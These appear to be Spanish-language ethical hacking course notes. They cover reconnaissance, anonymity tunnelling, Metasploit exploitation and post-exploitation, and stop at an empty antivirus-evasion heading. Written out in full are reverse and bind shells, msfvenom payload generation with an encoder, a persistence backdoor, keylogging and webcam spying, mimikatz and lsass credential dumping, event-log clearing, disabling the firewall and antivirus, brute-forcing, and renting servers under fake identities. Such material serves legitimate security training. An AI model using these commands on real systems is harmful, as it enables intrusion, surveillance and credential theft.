

# Haking ético

## Nociones básicas

### Ámbitos de la seguridad

Ámbito físico

identificar medidas de seguridad, accesos alternativos, evasion de control de acceso RFIC/NFC ( targeta de acceso ), evasión control biometrico, wireles, wifi.

Ámbito Digital

anonimacion de las comunicaciones, analisis servicios públicos, dominios internos,  todo lo relacionado al software.

Ámbito humano

el objetivo de este ábito es engañar al usuario mediante, vishing ( llamadas telefonicas ), usb cebo, mails con malware , suplantación de identidad, ingenieria social etc...



### Pruebas acotadas dentro de Hacking Ético

- **Ejercicios Read Team.**
  - Simulación de un ataque real donde la empresa desconoce las acciones que van a ser realizadas, cuando y por quien.
- **Test de Intrusión.**
  - Pruebas de intrusión con un alcance limitado, donde existe colaboración entre auditor  y empresa.
  - En este caso el ámbito de actuación esta definido, la organización conoce de parte de los detalles que se ejecutaran y se verifican vulnerabilidades y se explotan de manera limitada.
- **Auditoría de Vulnerabilidades**
  - Identificación de vulnerabilidades conocidas.
  - Suele estar dirigido a los servicios que especifica la empresa y únicamente se identifican las vulnerabilidades de dichos servicios.



### Tipos de enfoques

**Caja Negra:**  

El desconocimiento completo de cualquier información referente al activo a auditar. Este tipo de enfoque es el mas real ya que se simula un atacante real ya que desconoce todos los servicios.

**Caja Negra con Post-Autentificación:**  

Únicamente se tienen las credenciales de acceso. Este tipo de enfoque se realiza para prevenir vulnerabilidades de método interno o en lugares que se permite acceder a una red publica etc...

**Caja gris:**  

Conocimiento parcial del activo a auditar.

**Caja blanca:**   

Conocimiento completo del activo. Este método al tener el conocimiento total del activo se pueden identificar el total de las vulnerabilidades de los servicios del activo.



### Vectores de ataque  

**Ataque dirigido.**  

los ataques dirigidos consiste en un ataque a un objetivo en concreto, se suelen seguir los siguientes pasos.

- Reconocimiento: de información de la empresa o victima a atacar, consiste en identificar todos los posibles accesos.
- vector de acceso:  localizar el acceso más vulnerable y acceder a el mismo.
- persistencia: una vez dentro asegurarse de que si cierran un método de entrada puedas acceder por otro, infectando múltiples dispositivos.
- movimiento lateral: poder acceder a diferentes redes de la victima y asegurar un libre acceso entre ellas.
- acceso a los datos: Tener acceso y control de los datos de la victima.
- Extracción: extraer los datos.



**Ataque no dirigido**  

Los ataques no dirigidos se lanzan a multitud de dispositivos sin saber su destino.

- `malware`: infectar un dispositivo  insertando algún tipo de programa malicioso.

- `phishing` : suplantar la identidad e bancos, policía para extraer datos del usuario

- `explotación masiva`: infectar mayor número de dispositivos posibles para en un futuro tener el control y hacer un ataque masivo.



### Dispositivos de seguridad 

**Firewall ( cortafuegos )**  

Es un software o hardware que es capaz de filtrar el trafico entrante y saliente de la red para prevenir el acceso no deseado a las redes protegidas.

**red desmilitarizada (DMZ)**  

Es una red aislada intermedia entre internet y la red interna de la organización.

En este tipo de redes tenemos un primer firewall desde el router a los servidores públicos y un segundo firewall para la red interna, de esta manera desde el exterior se podra acceder a los servidores públicos y la red interna seguira protegida.



**Honeypot**  

Es un dispositivo que simula los servicios o dispositivos de nuestra red. esto sirve para que el atacante pierda tiempo intentando manipular estos dispositivos ya que se muestran mas vulnerables y a la vez nos avisa que alguien esta dentro de nuestra red.

**Sistema de detección de intrusos (IDS)**   

**NIDS:**

- intenta identificar comportamientos anómalos en la red

**HIDS:**

- intenta identificar comportamientos anómalos en los hosts



**Firewall de aplicación web (WAF)**  

es un sistema que se pone delante de una aplicación web e intenta identificar  si se esta ejecutando algún  tipo de ataque y lo corta.



## Laboratorio de pruebas

metasploitable I, II y III: distribuciones diseñadas para aprender a vulnerar sistemas y servicios.

https://www.vulnhub.com/entry/metasploitable-1,28/

https://www.vulnhub.com/entry/metasploitable-2,29/

Web for pentester I y II: vulnerar aplicaciones webmediante la especificación de diferentes tecnicas y la necesidad de evadir filtros.

https://download.vulnhub.com/dvwa/

Owasp broken web applications project: maquina virtual que desplega una gran cantidad de servicios web vulnerables.

https://sourceforge.net/projects/owaspbwa/files/

Existen aplicacciones web que se encargan de recopilar maquinas vulnerables. www.vulnhub.com 



## Introducción Kali

escanear pagina de cisco, extraer ip's de dominios

```bash
wget https://www.cisco.com 
grep "href=" index.html | cut -d"/" -f3 | grep "\." | cut -d'"' -f1 | sort -u > dominios.txt
for dom in $(cat dominios.txt);do host $dom | grep "has address" | cut -d" " -f4 ; done | sort -u > ips_cisco.txt
```



## Anonimato 

### Tunelización de protocolos

consiste en  de encapsular un protocolo dentro de otro creando un túnel. Es utilizado para transformar un protocolo determinado que comúnmente no se permite en una red.

para que este proceso sea efectivo tanto cliente como servidor deben establecer los parámetros de tunelización y protocolos que van a utilizar.

un ejemplo sería camuflar trafico SSH a través del trafico HTTP, se utilizaría el tunel del HTTP para enviar trafico SSH.

### Servidores proxy

Un servidor proxy funciona como punto intermedio entre el cliente y el servidor redireccionando las peticiones y respuestas de forma transparente entre ambas. Esto permite ocultar la dirección IP real del cliente, ya que el servidor vería unicamente la dirección IP del proxy.

Si a esto le sumas un encadenamiento de proxys en diferentes paises o continentes, el trabajo para descubrir la IP origen es mas tedioso.

### Virtual Private Network (VPN)

Es una tecnología que permite crear conexiones privadas entre dos puntos utilizando una red publica como internet.

El funcionamiento es que estableces una conexión segura con el servidor VPN y desde allí sales a internet. Podemos encontrar servicios VPN tanto de pago como gratuitos distribuidos por distintos paises.

muy utilizado para evitar intercepciones de 5rafico, conexiones seguras en sitios publicos y anonimizar conexiones.

### Redes de anonimación

TOR

Es la red anónima mas conocida a día de hoy. Consiste en una red completamente centralizada que aporta anonimato en la navegación por internet, así como acceso a la red de TOR.

Este funciona conectandose a traves de varias capas de cifrado en la red de tor, pasando por varios nodos de dicha red y finalmente salir de la red de tor a la red comun sin cifrar pero sin la posibilidad de saber quien eres. A no ser que en dicho mensaje hayan datos personales, por eso mismo no se deve acceder a sitios con identificación como email, dni, etc...

FREENET/I2P

Estas dos opciones son muy similares y lo que permiten es tener acceso a la red oculta dentro de internet denominada como *Dark Net* o *Deep Web* , esta red tiene la peculiardad de ser una red descentralizada.



### Proxy

**Proxychain** 

Es un proxy para enrutar programas, comandos desde el terminal, su configuración es muy sencilla igual que su modo de uso.

Su configuración se encuentra en  `/etc/proxychain.conf`  

```bash
# modo vervose
#quiet_mode
# pasar dns por proxy (recomendado)
proxy_dns
```

al final del todo, puedes poner tantos como quieras, por defecto viene configurado tor, pero lo puedes quitar o añadir debajo los proxys que quieres que valla recorriendo.

```bash
# tipo de conexion   ip 			 puerto		user 	pasword
# defaults set to "tor"
#socks4 			127.0.0.1		 9050
socks4               88.78.73.116    1080
```

Utilizar proxychains con wget.  canihazip es una web que nos dice que ip publica tenemos, utilizando proxychains mostrara que tenemos la ip publica `88.78.73.116` 

```bash
proxychains wget http://canihazip.com/s
```



**Foxyproxy**  

Un plugin del navegador donde puedes configurar tus proxy y cambiar entre ellos rápidamente.



### VPN

Con una VPN creas un túnel seguro hasta el servidor de la VPN y sale tu conexión de allí a la red. existen VPN gratuitas o opensource como `openvpn` o de pago .

**Vpn de pago:**  

Estos servicios de pago normalmente tienen un software de instalación para su utilización sencilla. Además te permite conectar a través de diferentes países ya que tienen servidores distribuidos por los diferentes continentes.

- `ExpressVPN` - Caribe

- `NordVPN` - Panama

- `TorGuard` - Antillas

- `IPredator` - Chipre

- `PureVPN` - Hong kong



### Cambiar Mac

En ocasiones es útil cambiar la mac de un ordenador para burlar listas blancas etc...

**windows**

administrador de dispositivos

adaptadores de red

opciones avanzadas

dirección administrada localmente --> valor



**linux** 

```bash
ifconfig eth0 down
macchanger -m 00:11:22:33:44:55 eth0
ifconfig eth0 up
# cambio random
macchanger -r
# cambio permanente
macchanger -p
```



### Creando plataforma anónima

Para crear una plataforma anónima ("legalmente") se han de seguir diferentes pasos.

- Contratación anónima de servidores VPS distribuidos en diferentes lugares ( comprarlos o alquilarlos con bitcoins y datos falsos ).
- Enlazar los servidores con túneles para un manejo fluido a la hora de ejecutar operaciones.

#### Creando túneles

Activar ssh en todos los vps

```bash
host1  192.168.122.1
host2  192.168.122.2
host3  192.168.122.3
```

##### Túnel Estático

Un túnel estático redirige las peticiones de un puerto local a otro host remoto en el puerto indicado.

```bash
# desde host2 
 # se conecta a host3 y se deja el tunel abierto
ssh -L 1234:192.168.122.3:22 root@192.168.122.3

# desde otra terminal de host2
ssh root@127.0.0.1 -p 1234
root@host3:~$_
```

Esta opción `1234:192.168.122.3:22` ejecutada desde host2 esta diciendo, abre el puerto 1234 en host2 y todo lo que entre por ahí, lo rediriges a host3 en el puerto 22. Por eso al hacer el ssh en al puerto 1234 en  host2 conectas a host3.



##### Túnel dinámico 

Un túnel dinámico redirige las peticiones de un puerto local a otro host remoto sin importar el puerto destino.

```bash
# desde host2
# establezco tunel dinamico desde host2 a host3
ssh -D 1234 root@192.168.122.3 
# host2 tiene abierto el puerto 1234 y redirige a host3 

# desde otra terminal en host2 configuro proxychains para conectar con el puerto que acabo de abrir.
cp /etc/proxychains.cong ./
vim proxychains.conf
# ultima linea
127.0.0.1	1234

# ahora todo lo que se ejecute con proxychains se reenviara a host3
root@host2~$ proxychains ssh root@127.0.0.1
root@host3~$_
```

>  Esto al ser solo un salto entre host no tiene mucho sentido ya que arias un ssh simple y ya. todo cobra sentido al añadir mas hosts en la ecuación.



##### Secuencia de Túneles

En este caso crearemos una mezcla de túneles dinámicos y estáticos, el host final con el penúltimo tendrán un túnel dinámico para poder lanzar cualquier tipo de petición, todos los demás host de la cola se conectaran mediante túneles estáticos para saber por que puerto seguir dicha cola.

Utilizaremos 3 host porque poner mas es repetir lo mismo una y otra vez, host3 sera el host final, conectara el host2 con el host3 mediante un túnel dinámico y luego el host1 conectara con host2 mediante un túnel estático. De esta manera los comandos ejecutados desde el host1 saldrán por el host3.

```bash
# desde host2
# establezco tunel dinamico desde host2 a host3
ssh -D 1234 root@192.168.122.3 
# host2 tiene abierto el puerto 1234 y redirige a host3 

# desde otra terminal en host2 configuro proxychains para conectar con el puerto que acabo de abrir.
cp /etc/proxychains.cong ./
vim proxychains.conf
# ultima linea
127.0.0.1	1234

# desde host1
cp /etc/proxychains.cong ./
vim proxychains.conf
# ultima linea
127.0.0.1	4321

#  crear túnel estático y dejar abierto
ssh -L 4321:127.0.0.1:1234 root@192.168.122.2 


# ----- comprobar que funciona -----------------------
# desde otro terminal de host1 abro un puerto
nc -lvvp 6666

# desde otro terminal host1
proxychains  nc 192.168.122.1 6666
conexion a 192.168.122.1 desde 192.168.122.3

# desde host1 conectar con host final
proxychains ssh root@127.0.0.1
root@host3~$_
```

> para añadir mas nodos solo se tendría que repetir las acciones echas en el host1 cambiando los puertos correspondientes y la ip del nodo a seguir.



## Identificación y explotación de vulnerabilidades en sistemas



### Metodología

Para lograr auditar y vulnerar un sistema es necesario seguir una serie de pautas.

1. Obtención de datos:  recolectar la máxima información de los dispositivos de una organización, así como servicios públicos, etc...
2. Enumeración de sistemas: enumerar y organizar que sistemas o redes tiene dicha  organización y versiones de dichos sistemas o servicios.
3. Análisis de vulnerabilidades: identificar las vulnerabilidades conocidas para cada sistema o servicio de la organización.
4. Explotación de vulnerabilidades:  intentar acceder al dispositivo a través de alguna vulnerabilidad.
5. Post-extracción de vulnerabilidades: una vez dentro del sistema exportar datos sensibles, pivotar entre redes, asegurar conexiones futuras, etc...
6. Documentación.



### Obtención de datos  

Para la primera identificación de datos se puede utilizar el comando `whois` o  una aplicación web similar a `whois.domaintools.com`  de esta manera podremos extraer datos como: dns, números de teléfono, localización y algún dato útil mas.

```bash
whois gencat.cat
...
Registrant Name: Generalitat de Catalunya
Registrant Organization: Generalitat de Catalunya
Registrant Street: Via Laietana, 14
Registrant City: Barcelona
Registrant State/Province:
Registrant Postal Code: 08003
Registrant Country: ES
Registrant Phone: +34.935676330
Registrant Email: dominis.ctti@gencat.cat
...
Name Server: a16-65.akam.net
Name Server: a1-133.akam.net
Name Server: a11-64.akam.net
....
```

> Es importante hacer la resolución de dominio para obtener la ip y volver a buscar con `whois` mas información.



#### Recolección de datos

Para empezar a auditar una organización necesitamos obtener todos los sistemas autónomos a los que pertenece si es que los tiene, para después extraer todos los rangos de ip publicas en las que se aloja, para extraer todos los dominios y subdominios que pertenece a dicha organización.

Esta labor es lenta y bastante pesada ya que hay que estar atento a los detalles y en según que organización la cantidad de datos extraídos será muy alta.



##### Análisis de direcciones ip

Para la extracción de direcciones ip existen aplicaciones como www.robtex.com  que nos facilitara el trabajo.

Esta aplicación mediante un dominio o una dirección ip extrae una buena información como dns, subdominios, etc...



###### Curiosidad  

Se puede utilizar robtex para evitar los filtros que tienen algunas webs como mailinator o guerrillamail.

Estas dos opciones son de correo basura temporal, lo primero que tenemos que hacer es añadir el dominio de `guerrillamail.com` a robtex.

En el apartado `shared`  buscar `using as mail server` o `partially sharing ip numbers`.

- Este apartado devuelve los dominios y subdominios que apuntan a la ip del dominio principal.

Por ultimo al enviar un email cambiar el dominio que nos a dado la web de guerrilla en el email, normalmente `@sharklasers.com` por el que hemos extraído de robtex.



##### Análisis de sistemas autónomos  

Un **Sistema Autónomo** (en [inglés](https://es.wikipedia.org/wiki/Idioma_inglés), *Autonomous System*: **AS**) se define como “un grupo de redes [IP](https://es.wikipedia.org/wiki/Protocolo_IP)
que poseen una política de rutas propia e independiente”. Esta definición hace referencia a la característica fundamental de un Sistema Autónomo: realiza su propia gestión del tráfico que fluye entre él y 
los restantes Sistemas Autónomos que forman Internet. Un número de AS o  ASN se asigna a cada AS, el que lo identifica de manera única a sus  redes dentro de internet.

Esto lo utilizan las organizaciones para tener mayor velocidad entre todos sus dominios y subdominios.

Para la extracción y analisis de sistemas autónomos se pueden utilizar aplicaciones como  www.ipv4info.com o [bgphurricane](https://bgp.he.net/)

Se puede buscar por dominio, ip , nombre sistema autónomo o nombre de la compañía.

De esta manera extraeremos todos los sistemas autónomos de la organización, sus rangos de ip públicos y sus dominios.



##### Análisis de dominios y subdominios

Una buena aplicación para extraer subdominios es www.dnsdumpster.com , en ella le insertaremos el dominio a buscar y extraerá sus subdominios junto a sus ip correspondientes.



#### Browser Hacking  

Operadores de búsqueda  

```
site:udemy.com  # datos en udemy
- 	# negacion
#10..19#	# rango 
intitle:"index of /" 	# buscar en titulo
allintitle:"index of /"	# busca en titulo exactamente "index of /"
inurl:"admin.php"	# buscar en la url
intext:"admin" intext:"password" # buscar exclusibamente en el texto
filetype:pdf # ficheros pdf
ext:pdf 	# extensiones pdf
inurl:admin &&  ext:sql  # and
(inurl:admin OR ext:sql )	# or
```

[google hacking database](https://www.exploit-db.com/google-hacking-database)



#### Herramienta para facilitar el análisis

`maltego` es una herramienta gráfica para recopilar información de una organización utiliza las aplicaciones anteriores como robtex, whois y otras para extraer toda la información.

Al instalar maltego requiere la versión 8 de java para su funcionamiento, dejo una opción para su cambio rápido de versión en el sistema.

```bash
 sudo update-alternatives --config java
[sudo] password for debian: 
Existen 2 opciones para la alternativa java (que provee /usr/bin/java).

  Selección   Ruta                                            Prioridad  Estado
------------------------------------------------------------
* 0            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      modo automático
  1            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      modo manual
  2            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   1081      modo manual

```



`recorn-ng` es otra aplicación de terminal para recopilar información de una organización.

```bash
recorn-ng
[recon-ng][default] > workspaces add udemy
[recon-ng][udemy] > add domains udemy.com
[recon-ng][udemy] > show modules
[recon-ng][udemy] > use recon/domains-hosts/hackertarget
[recon-ng][udemy][hackertarget] > show info
[recon-ng][udemy][hackertarget] > set SOURCE udemy.com
SOURCE => udemy.com
[recon-ng][udemy][hackertarget] > run
---------
UDEMY.COM
---------
[*] [host] mx01.udemy.com (104.16.91.52)
[*] [host] web1.udemy.com (104.16.91.52)
[*] [host] mail1.udemy.com (104.16.91.52)
[*] [host] server1.udemy.com (104.16.91.52)
...
```





theharvester

```bash
python theHarvester.py -d udemy.com -l 500 -b google
```



##### Extracción metadatos 

`foca`  es un programa de windows para extraer los metadatos de archivos, a su vez si insertas un dominio busca todos los archivos públicos en ese dominio y los analiza.



### Enumeración

Una vez ya hemos recolectado toda la información de la organización, queda verificar que dispositivos están activos en los rangos y extraer versiones de servicios o sistemas operativos.



De forma pasiva existen diferentes aplicaciones muy útiles.

`shodan` dados unos patrones de búsqueda extrae datos sobre servicios, sistemas o puertos, entre otras.

```bash
apache country:es
net:150.224.0.0/16
port:80
title:portal
org:"Universidad autonoma de madrid"
```

`zoomeye` es muy similar a shodan.

`censys ` es similar a las anteriores con la opción de buscar por tipo certificado.



De forma  activa, tenemos las siguientes opciones:

**nmap** 

puede extraer puertos abiertos, sistema operativo o versión del servicio. ( es un poco lento )

```bash
nmap -Pn 10.1.1.0/24 	# forzar escaneo todos los dispositivos
-sT 	# servicios tcp
-sU		# servicios udp
-p 443,80 	# puertos
-p-	# todos los puertos
-n 	# no hacer resolucion dns
-T1  -T5	# t1 escaneo lento t5 rapido
--top-ports=10 --open	# buscar top 10 puertos y mostrar solo abiertos
-iL fichero-de-ips
-sV		# version servicio
-O		# version de sistema operativo
-sC 	# lanzar scripts para interactuar con puertos
-A		# equivale a (-sV -sC -O tracerouter)
```



**netcat/nc** 

Examina los puertos abiertos  rápidamente.

```bash
 nc -zvn 192.168.88.4 22-80 
 -z # escanea y lista servicios
 -v  # vervose
 -n # no hacer resoluciones dns
```



**mediante dns** 

podemos extraer datos de los dns mal configurados con las siguientes herramientas.

Pedir al dns que haga una transferencia de zona y nos envíe todos sus datos, est solo funcionara si esta mal configurado.

```bash
host -t axfr udemy.com
dig axfr @SERVIDOR.DNS  udemy.com
```

Extraer datos el dns

```bash
dnsenum -enum udemy.com
dnsenum -s 5 -p 5 udemy.com

dnsrecon -ad udemy.com
# intntar extraer subdominios
dnsrecon -d udemy.com -t [crt,goo,bing,axfr...]
dnsrecon -d escoladeltreball.org -D /home/debian/dicionario -t brt

fierce -dns udemy.com
```





### Análisis 

En el análisis nos dedicaremos a detectar las vulnerabilidades y explotarlas para intentar obtener el control del sistema.

dos páginas muy utilizadas donde encontrar diferentes tipos de exploits son https://www.exploit-db.com , https://www.securityfocus.com . 



#### Detección vulnerabilidades

Se pueden detectar vulnerabilidades de forma manual o automática,  si tenemos un gran número de dispositivos la forma manual es inviable, pero si solo queremos explotar un servicio es una opción. 

las aplicaciones mas conocidas para la detección de vulnerabilidades son: [nessus](https://es-la.tenable.com/products/nessus) , http://www.openvas.org/ . 

detectar versión de smb y sus características:

```bash
nmap -p445 -T4 -sT   -A  10.0.0.1
enum4linux  -t 10.0.0.1
```



#### Tipología de exploits

Cuando hablamos de un exploit nos referimos al software que permite tomar cierta ventaja de una vulnerabilidad ya sea para acceder al sistema,  elevar privilegios, realizar denegación de servicios, etc...

**Exploits remotos:** Son aquellos que se lanzan de forma remota a aquellos dispositivos que se tiene visibilidad.

**Exploits locales:** son aquellos que se lanzan una vez ya estas dentro del sistema, normalmente para elevar privilegios.

**Exploits del lado del cliente:** Son los que se lanzan normalmente a una plataforma web y afectara a los clientes que se conecten a dicha plataforma.



#### Tipos de conexión

##### Conexión directa

En la conexión directa  accedes estableces un túnel desde el host atacante al vulnerable, el vulnerable tendrá un puerto abierto en escucha y conectaremos contra él. Este tipo de conexiones es posible que fallen ya que en el firewall se acede desde fuera hacia adentro y si esta bien configurado lo filtrara.

```bash
#  host vulnerable abre puerto de escucha
nc -lvvp 1234 -e /bin/bash
# atacante se conecta a puerto conocido
nc  10.0.0.5 1234
~# _
```



##### Conexión inversa

En esta conexión lo que se crea un túnel que sale del host vulnerable al host atacante, de esta forma en la gran mayoría de firewalls no lo filtraran. El modo de uso es el atacante abre un puerto a la escucha y el vulnerable mediante un exploit se conectara al atacante.

```bash
# atacante abre su puerto
nc -lvvp 1234
# vulnerable se conecta al atacante 
nc 10.0.0.6 -e /bin/bash
```





#### Metasploit

Metasploit es una herramienta que facilita mucho la hora de explotar una vulnerabilidad, básicamente trabaja con una base de datos donde se encuentran todos sus exploits y luego ejecuta un payload, que sería la acción que quieres hacer al haber accedido al sistema. también tiene la aplicación *artimage* que seria su equivalente gráfica, aun que tiene un rendimiento menor.

Toda la información de metasploit se encuentra en `/usr/share/metasploid-framework/`  y dentro de `modules/exploits/` se encuentran todos los exploits que utiliza, si quisiéramos añadir alguno, solo tendríamos que copiarlo en este directorio.

Al iniciar metasploit lo primero que tenemos que comprobar es que la base de datos esta bien conectada.

```bash
msfconsole  #  iniciar metasploit
msf> search ms08	# hacer busqueda en bd
# en el caso de no tener BDatos
msf> exit
msfdb init
# volver aentrar y comprobar
msfconsole
msf> db_status
msf> db_rebuild_cache
```



##### workspaces  

Para  organizarnos en caso de hacer varias tareas a la vez usaremos diferentes espacios de trabajo.

```bash
workspace -h  # help
workspace -a udemy # crear spacio udemy
workspace -d udemy	# eliminar udemy
workspace udemy		# entrar en espacio udemy
workspace 	# ver espacios disponibles
```



##### Exploit

con el exploit lo que hacemos es atacar la vulnerabilidad.

```bash
search ms08 # buscar la vulnerabilidad que queremos
use exploit/windows/smb/ms08_067_netapi # cargarla
show info	# ver información
show options # ver opciones de parametros requeridos
set # añadir parameros 
```

Por cada exploit en la página https://www.rapid7.com/db esta un pequeño manual de uso, esta página es de los mismos creadores de metasploit y se actualiza periódicamente.



##### Payloads

Son las acciones a realizar justa al haber ejecutado el exploit.

Ejemplos de payloads:

```bash
windows/adduser		# creación de usuarios
windows/vncinject/reverse_tcp	# conexión vnc
windows/shell/reverse_tcp	# tunel inverso
```

Estas payloads también tienen sus opciones de parámetro y se tendrán que añadir con `set`



##### Explotar vulnerabilidad

Para explotar una vulnerabilidad hay que cargar un exploit y un payload y añadir sus parametros requeridos.

en este caso explotaremos una vulnerabilidad de los dispositivos windows xp,2003 de smb.

```bash
msfconsole
workspace udemy		# acceder al spacio de trabajo elejido
search exploid ms08	# buscar el exploid que queremos
use exploit/windows/smb/ms08_067_netapi	# cargarlo
show options	# ver opciones requeridas
set rhost 10.0.0.10		# añadir remote host requerido
set payload windows/meterpreter/reverse_tcp	# cargar payload de tunel inverso
show options	# ver opciones requeridas
set lhost 10.0.0.5	# añadir local host requerido
exploit	# ejecutar ordenes
meterpreter >_	# si todo a ido bien nos debuelve una shell en la victima
```



##### Background  

Una vez conectado en un host interactivamente tendremos una terminal, y si queremos seguir con otras cosas podemos echar mano al background, que llega a ser tener diferentes sesiones de metasploit.

```bash
metasploit@maquina-remota> background  # o también Ctrl+Z   dejar en segundo plano
msf> sessions  	# ver sesiones abiertas
ms> session -i 5	# acceder a la session 5
```



##### Importar datos de nmap

Es posible que si tenemos datos de nmap previos importarlos y así trabajar con ellos desde metasploit

```bash
nmap 10.0.0.5 -A -Pn -n -oX pruevas-windows.xml # ejecutar nmap dejando datos en salida xml
msfconsole	# entrar en metasploit
msf> db_import /root/escaneos/pruevas-windows.xml # importar archivo
msf> hosts	# datos de hosts
msf> services # datos de servicios

# se puede ejecutar directamente nmap desde metasploit también
msf> db_nmap -A 10.0.0.5
```

**filtrado**  

```bash
hosts -c column,columna -S filtrado
services -c columna,columna  10.0.0.5
services -p 445
```



##### Añadir módulos

```bash
mkdir /usr/share/metasploid-framework/modules/exploits/test
# o si lo quieres solo para un usuario
mkdir -p ~/.msf4/modules/exploits/test
# añdir el modulo dentro de test
cp test-module.rb  /usr/share/metasploid-framework/modules/exploits/test/

# recargar modulos en metasploit
msf> reload_all
msf> use exploits/test/test-module
```



##### Generar archivo con payload

```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=10.1.1.22 lport=4445 -e x86/shikata_ga_nai  -i 3 -f exe -o test.exe
```

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set lhost 10.1.1.22
set lport 4445
exploit
```





### Post-explotación

En la post-explotación ya estamos dentro del sistema vulnerable y este paso las tareas son: elevar privilegios, analizar comportamiento del usuario, análisis tráfico red, abrir puertas traseras, acceder a otras redes.

#### Extraer información del sistema

siempre desde la terminal de `metasploit>`

```bash
help
use -l
sysinfo
getuid # usuario corriendo
getpid # pid corriendo
ps  	# procesos
migrate 368 # cambiar a proceso 368
run checkvm # verificar si es una maquina virtual
run get_env	# ver variables de entorno
run get_application_list  # ver aplicaciones instaladas
```

```bash
run scraper #  exportar información del sistema
run winenum # lo mismo con mas datos
~/.msf4/logs/scripts/scraper
```

> estos dos comandos exportan datos a la máquina local, por lo tanto hacen mucho ruido



#### Elevar privilegios

```bash
getuid # ver privilegios actuales
getsystem -h
getsystem # levar privilegios a system
getuid
rev2self  # volver a privilegios anteriores

hashdump # ver credenciales usuarios, equivale a /etc/passwd
```

Para que metasploit pese menos, no carga todas las librerías por defecto. Podemos cargar las opcionales a medida que las necesitamos.

```bash
use mimikatz # cargar libreria mimikatz
wdigest	# ver credenciales

use kiwi # cargar libreria kiwi 
creds_all # ver credenciales
```



#### Eliminar rastros y sistemas de seguridad

```bash
clearev  # borrar visor de eventos

shell # acceder a la shell del sistema
# desactivar firewall
netsh show opmode
netsh firewall set opmode mode = disable profiles = all

run killav #desactivar antivirus
```



#### Espionaje

```bash
keyscan_start # espiar movimiento de teclado
keyscan_dump  # exportar movimientos
keyscan_stop

screenshot  # extraer sccreenshot del sistema 
run vnc	# abrir ventana vnc

record_mic 10	# grabar micro 10 segundos
webcam_list
webcam_snap 1	# extraer foto de camara 1
webcam_stream 	# extraer video en directo
webcam_chat		# abrir chat
```



#### Snifer

```bash
use sniffer
sniffer_interfaces
sniffer_start 1 1024 # numero de interfaz y buffer
sniffer_dump 1 pruebas.pcap
sniffer_stop 1
```



#### Backdoor

```bash
run persistence -h
run persistence -A -L c:\\temp\\ -X -i 3600 -p 4443 -r 10.1.1.22
# si a ido bien devolvera datos de lo que hace incluido donde aloja los scripts

# para dejar que conecte automaticamente
resource  ~/.msf4/persistence/.../...rc
# esto lo que hace es borrar los archivos del persistence
```

- `-A` ejecutar al arrancar

- `-L` localización del payload

- `-X` conectar en el boot de windows

- `-i` periodo de reintento en segundos



Una vez que esta lanzado el persistence en la máquina vulnerable, tenemos que abrir nuestro puerto para que se conecte.

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set lhost 10.1.1.22
set lport 4443
exploit
```



#### Pivoting

```bash
ipconfig
background

route add 10.1.2.0/24  1 # el 1 es el numero de sesion
route
```



#### Conectar de windows a windows 

En el caso que queramos acceder desde un host windows a otro windows remotamente desde linea de terminal, es posible con `psexec`. Este se encuentra entre los ejecutables de `pstools` que podemos encontrar en las herramientas de windows.

https://docs.microsoft.com/en-us/sysinternals/downloads/pstools

```bash
# programa	ip-destino      dominio\usuario	 contraseña	  que-ejecutar
psexec.exe  \\10.1.1.13 	-u WIN7\pedro 	-p pedro123 	cmd.exe
```

- El problema de esta opción es que tenemos que tener todos los datos.





#### De shell a meterpreter

Si por la razón que sea solo hemos podido acceder a un dispositivo windows desde una shell y queremos  utilizar las utilidades de meterpreter, tenemos una posible solución.



```bash
use exploit/windows/smb/psexec
set payload windows/shell/reverse_tcp
set .... # añadir opcione requeridas
exploit
C:> Ctl+Z	# dejar sesion en 2º plano

use post/multi/manage/shell_to_meterpreter
set lhost ...
set session ...
run

sessions # ver sesiones activas, ( se habra creado ua nueva )
sessions  -i ...	# entrar en sesion nueva
```

> Donde añado `...`  introducir el argumento por el payload o comando.



#### Extraer credenciales

Desde windows tenemos el programa mimikatz que entre otras cosas, nos permite extraer las credenciales de los usuarios con un sesión abierta, ya que mimikatz las extra los datos temporales cargados en ram.

descargar mimikats: https://github.com/gentilkiwi/mimikatz/releases

ejecutar el archivo exe con permisos de administrador de la arquitectura de vuestro sistema operativo. 

```bash
mimikatz.exe
privilege::debug	# comprobar privilegios 
sekurlsa::logonpasswords # extraer credenciales ram
```

Bien ahora combinando `psexec` y `mimikatz`  podríamos llegar a extraer los datos de la cuenta admin de un host remoto desde un usuario sin privilegios.

```bash
psexec.exe  \\10.1.1.13 -u WIN7\pedro  -p pedro123 -c mimikatz privilege::debug sakurlsa::logonpasswords exit > crecenciales.txt
```



##### Ophcrack

Es un programa tanto instalable como portable que extrae los hash el sistema y tiene la posibilidad de crackear mediante fuerza bruta los hashes.



##### Procdump

Es otro programa de windows para extraer hash del sistema, este los extrae en un formato `.dmp` para posteriormente descifrarlo con mimikatz u otros.

Los archivos que utiliza para esta extracción son `windows/system/config/{sam,system}`   

```bash
procdump.exe -na lsass.exe lsassdump -accepteula
```

```bash
mimikatz.exe
sekurlsa::minidump lsassdump.dmp
sekurlsa::logonpasswords
```



##### unshadow/john  

Estos son 2 comandos de linux donde juntan los usuarios con sus contraseñas cifradas en un archivo, para posteriormente descifrarlas mediante fuerza bruta.

```bash
unshadow /etc/passwd /etc/shadow > hash-unix
john hash-unix
```



##### Fuerza bruta

Esta la posibilidad de utilizar fuerza bruta para resolver contraseñas, hay diferentes métodos:

- profundidad: 1 usuario muchas contraseñas 
- anchura: muchos usuarios y una contraseña
- profundidad/anchura:  muchos usuarios y muchas contraseñas.

Estos procesos son muy lentos y en según que casos el servicio puede bloquearnos por el uso excesivo de pruebas, en todo caso este método hace uso de diccionarios, es decir una lista muy grande de  posibilidades e ir probando hasta que alguna coincida.

```bash
hydra -L users -p Soc123 -vV 10.1.1.5 smb # diccionario de usuarios a 1 contraseña
hydra -l soc -P paswords -vV 10.1.1.5 smb	# diccionario de passwords a 1 usuaro
hydra -L users -P paswords -vV 10.1.1.5 smb	# diccionario de users y passwords
```



Módulos de medusa `/usr/lib/medusa/modules` 

```bash
medusa -u soc -p soc1234 -h 10.0.0.5 -M smb
```



```bash
ncrack -p 445  --user soc --pass soc123 10.0.0.5
ncrack -p 445  -U users --pass soc123 10.0.0.5
```





#### Evadir antivirus  

